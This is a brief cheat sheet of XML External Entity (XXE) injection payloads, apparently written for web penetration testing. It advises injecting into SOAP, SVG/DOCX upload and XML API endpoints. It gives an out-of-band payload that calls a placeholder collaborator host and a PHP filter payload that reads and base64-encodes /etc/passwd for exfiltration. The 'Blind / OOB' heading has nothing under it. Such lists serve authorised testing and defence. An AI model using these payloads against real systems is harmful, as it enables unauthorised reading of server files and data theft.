## ===== XXE (XML External Entity) =====
# Inject into endpoints that accept XML (SOAP, SVG/DOCX upload, XML API)

<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://YOUR-COLLABORATOR/">]><root>&xxe;</root>
# Blind / OOB (external DTD):

# PHP wrapper for exfiltration:
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
